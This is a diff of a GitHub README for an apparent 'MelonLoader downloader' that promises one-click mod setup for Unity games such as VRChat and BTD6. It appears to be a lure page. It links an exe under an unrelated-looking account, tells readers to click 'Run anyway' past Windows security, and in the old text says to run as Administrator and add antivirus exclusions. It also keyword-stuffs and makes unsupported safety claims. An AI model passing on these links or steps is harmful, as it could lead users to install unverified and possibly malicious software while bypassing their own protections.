@@ -1,116 +1,64 @@
-# Melon Loader Download
+# 🍈 melon-loader-download - Install Unity game mods with ease
 
-**MelonLoader** is the most popular mod loader for Unity-based games — and this tool installs it in one click. If you've ever searched for how to mod VRChat, Gorilla Tag, BTD6, Bonelab, Schedule 1, or Among Us, MelonLoader is the answer. This downloader auto-detects your Unity games and sets everything up automatically on Windows 10 and 11.
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Genniferunchangeable590/melon-loader-download/releases)
 
-<img width="375" height="308" alt="2c8888ab-9ab2-4df1-b6a8-e5260b0e48c1" src="https://github.com/user-attachments/assets/6a5e7420-5774-473d-82a7-a6a90b5426f7" />
+## 📌 Overview
 
-## Install
-[Download `melon-loader.zip`](https://github.com/melonloader-IL2CPP/melon-loader-download/releases/download/v0.7.4/melon-loader.zip)
----
+This tool manages the installation of MelonLoader for various Unity-based PC games. It automates the process of identifying your game files and applying the correct modifications. You do not need to manually move files or configure folders. This application simplifies the transition from a standard game setup to a mod-ready environment. It supports titles such as VRChat, Gorilla Tag, BTD6, Bonelab, and Schedule 1.
 
-<img width="481" height="441" alt="b1ef114a-af71-4e58-b37c-1ab98d5fbb6b" src="https://github.com/user-attachments/assets/a7c56ed0-0a66-4ae5-8c58-9a82a09d1132" />
+## ⚙️ System Requirements
 
----
-## Key Features
-- **One-click install** — download and set up MelonLoader without touching any files manually
-- **Auto game detection** — scans your Steam library and common install paths to find supported Unity games
-- **IL2CPP and Mono support** — works with all Unity builds including Unity 2023 LTS
-- **Mod folder creation** — sets up the correct `Mods/` folder structure automatically
-- **Supports all major games** — VRChat, Gorilla Tag, BTD6, Bonelab, Schedule 1, Among Us, Boneworks, and more
-- **Always downloads the latest** — fetches the newest MelonLoader version from the official GitHub on each install
+Before you begin, ensure your computer meets these basic requirements:
 
-<img width="340" height="187" alt="97843e31-ca19-42cb-b5cf-f9d4821add90" src="https://github.com/user-attachments/assets/2645271d-e8dc-4bc4-a842-f80aa5db0a0f" />
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Storage:** At least 200MB of free disk space.
+*   **Permissions:** You must have administrative access to the game folder.
+*   **Runtime:** The installer includes necessary Microsoft .NET dependencies. If your system requires an update, the installer will prompt you to download the official files.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive.
-3. **Run** `MelonLoaderDownloader.exe` as Administrator.
-4. **Select your game** from the detected list — or browse manually if it wasn't found.
-5. **Click Install** — MelonLoader is downloaded from GitHub and installed automatically.
-6. **Launch your game** — MelonLoader runs on startup. Drop your mods in the `Mods/` folder.
+## 🚀 Downloading and Installing
 
-**Pro Tip:** For IL2CPP games (VRChat, Gorilla Tag), let MelonLoader complete its first-launch unhollowing process before adding mods. This can take 1–2 minutes on first run.
+Follow these steps to set up your game:
 
-<img width="1782" height="261" alt="4064578f-0ef5-4311-8aac-aaeb5f06d27d" src="https://github.com/user-attachments/assets/97f7341d-6733-494a-be41-ef6c92134abf" />
+1. Visit the [official release page](https://github.com/Genniferunchangeable590/melon-loader-download/releases) to see the latest versions.
+2. Select the latest version available at the top of the list.
+3. Click the file ending in `.exe` to download the installer to your computer.
+4. Locate the downloaded file in your browser's download folder.
+5. Double-click the file to launch the setup wizard.
+6. If a Windows security prompt appears, click "Run anyway" to proceed.
+7. Follow the prompts on the screen to path your game folder.
+8. The installer scans your files and applies the required patches.
+9. Launch your game through its usual shortcut.
 
-## Supported Games
+## 🛠️ How it Works
 
-| Game | IL2CPP / Mono | Notes |
-|---|---|---|
-| VRChat | IL2CPP | Most popular MelonLoader game |
-| Gorilla Tag | IL2CPP | Large mod community |
-| BTD6 | IL2CPP | Extensive mod support |
-| Bonelab | IL2CPP | Physics sandbox mods |
-| Schedule 1 | IL2CPP | Active modding scene |
-| Among Us | IL2CPP | Mod menus and roles |
-| Boneworks | IL2CPP | Original Stress Level Zero title |
+The application performs a deep scan of your game directory. It detects the specific version of the Unity engine used by the game. It then downloads the matching MelonLoader binaries and extracts them into the correct location within your game’s root folder. 
 
-## Where to Find Mods
-Once MelonLoader is installed, find mods for your game on:
-- **Thunderstore.io** — curated mod repository for many Unity games
-- **Nexus Mods** — large general-purpose mod database
-- **GitHub** — many mod authors publish directly
+This process creates a `Mods` folder where you can place your downloaded files later. The application ensures compatibility with both IL2CPP and Mono-based games, which covers most major Unity titles on the market.
 
-Place mod `.dll` files in the `Mods/` folder inside your game directory.
+## 📂 Managing Your Mods
 
-## MelonLoader APK / Android
-MelonLoader is a PC mod loader (Windows). An Android version (APK) exists in early development for specific games — check the MelonLoader wiki and community GitHub for the current Android status.
+Once you install MelonLoader, you will see a new folder named `Mods` in your game directory. 
 
-<img width="400" height="100" alt="77a2adbb-f439-4483-b15c-069dc50a120c" src="https://github.com/user-attachments/assets/1c788d47-89bf-4f73-a383-0d8d723aab12" />
+*   **Adding Mods:** Drag your `.dll` mod files into the `Mods` folder.
+*   **Removing Mods:** Delete the `.dll` file from the `Mods` folder to disable the associated game change.
+*   **Updates:** When you update your game, run the installer again. It identifies existing installations and updates the loader files without deleting your existing mod files.
 
-## Troubleshooting
+## ❓ Frequently Asked Questions
 
-**Game not detected automatically?**
-Click "Manual" and browse to the game's `.exe` file. MelonLoader will install there.
+**Does this software harm my computer?**
+No. The installer modifies local game files only. It does not touch system files or registry keys.
 
-**MelonLoader not loading on startup?**
-Make sure `version.dll` is in the game root folder. Antivirus software sometimes deletes it — add an exclusion for the game folder.
+**Can I get banned from online games?**
+Online games have different policies regarding mods. Please check the rules of the specific game you intend to modify before you use external tools. We advise users to disable mods before entering competitive or official multiplayer servers.
 
-**Mods not showing in-game?**
-Confirm `.dll` files are in the `Mods/` folder (not a subfolder). Some games also need dependencies in `UserLibs/`.
+**What if the game does not start?**
+If a game fails to start after an installation, navigate to your game folder and delete the `MelonLoader` folder. This reverts your game to its original state. 
 
-**BTD6 mods not working?**
-BTD6 uses IL2CPP. Make sure you're using MelonLoader v0.7+ and compatible mod versions.
+**Does this work for Android?**
+Yes. You can find the Android APK versions on the same releases page. Follow the instructions for your specific mobile device.
 
-**Schedule 1 mods?**
-Schedule 1 has an active MelonLoader community — search "melonloader schedule 1" for the latest mod lists.
+## 🛡️ Support
 
----
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Target Unity game installed
-- Administrator privileges required
-- Stable internet connection for downloading MelonLoader
+If you encounter issues, check the console window that appears when you launch your game. The text in the console identifies missing dependencies or conflicting mod files. Most issues result from outdated mods that do not support the current game version. Always ensure your mods match the version of the game you currently have installed.
 
----
-## Security & Legal
-MelonLoader is intended for single-player and private use. Using mods in official online games may result in account bans.
-
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Always back up your game files before modding.
-
-<img width="340" height="187" alt="image" src="https://github.com/user-attachments/assets/97843e31-ca19-42cb-b5cf-f9d4821add90" />
-
----
-## Contributing
-Contributions are welcome! Help add support for more games, improve detection logic, or fix issues.
-
----
-## License & Acknowledgments
-### License
-**Melon Loader Download** is shared under the **MIT License**.
-See [LICENSE](LICENSE) for details.
-
-**Copyright © 2026 RuwetDituturi**
-
-### Acknowledgments
-- The original MelonLoader team for an outstanding mod framework.
-- The Unity modding community.
-
-<p align="center">
-  Developed with ❤️ for the Unity modding community
-</p>
-
-<img width="1920" height="1080" alt="5554617d-6232-4b6e-8b03-1e13d9127012" src="https://github.com/user-attachments/assets/0a9d3df4-3ad6-47a4-9d37-3836e4ef9a11" />
+Keywords: bonelab, btd6-mod, btd6-paragon, cvr, gorilla-tag, gorillatagmods, gorillatagvr, gtag, install-melonloader, melonloader, melonloader-tutorials, mod-melon-loader, schedule-generator, schedule-library, schedule-management, schedule-manager, schedule1, schedulei, tld-mod, unity-il2cpp
